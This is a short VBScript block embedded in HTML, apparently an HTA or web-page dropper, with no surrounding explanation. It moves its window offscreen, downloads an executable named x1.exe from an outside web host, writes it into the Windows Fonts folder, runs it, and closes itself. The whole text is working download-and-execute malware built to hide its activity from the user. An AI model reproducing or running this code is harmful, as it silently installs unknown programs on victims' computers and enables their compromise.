<script language="vbs">
self.MoveTo 5000,5000
Set shell=CreateObject("WScript.Shell")
ddd = shell.SpecialFolders("Fonts") + "\" + "x1.exe"
set dot=CreateObject("Msxml2.XMLHTTP")
dot.Open "GET", "http://news.root-soft.com/x1.exe", false
'WScript.Sleep(300)
dot.Send()
cs = dot.responseBody
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.CreateTextFile(ddd)
for i = 0 to UBound(cs)
c = ascb(midb(cs, i+1, 1))
f.Write chr(c)
next
f.close
shell.run(ddd)
window.close()
</script>
